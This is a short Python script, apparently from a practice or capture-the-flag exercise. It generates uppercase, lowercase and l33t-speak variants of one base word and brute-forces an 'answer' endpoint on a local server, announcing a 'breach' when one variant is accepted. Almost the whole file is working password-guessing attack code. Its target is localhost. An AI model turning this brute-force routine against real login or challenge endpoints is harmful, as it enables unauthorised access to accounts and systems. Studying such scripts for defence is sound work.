import requests
from itertools import product as iterprod

# Create a wordlist

'''
    Extension to standard std in order to use extended l33t functionality in itertools.product.
'''
class l33tw0rd(str):
    def l33t1fy(self):
        return self.replace("a", "4").replace("e", "3")

baseword = l33tw0rd("vaapukkamehu")

wordlist = map(''.join, iterprod(*zip(
    baseword.upper(),
    baseword.lower(),
    baseword.l33t1fy()
)))

# Send request

url = 'http://localhost:5000/ovi/'

success = False
for word in wordlist:
    res = requests.post(url, json={"answer": word})
    if res.status_code == 200:
        print("We're coming in (with answer '"+ word +"')! " + res.text)
        success = True
        break

# if wordlist was successful, write it to a file
if success:
    print("--- Successfull Breach! ---")

    with open('wordlist.txt', 'w') as f:
        for w in wordlist:
            f.write("%s\n" % w)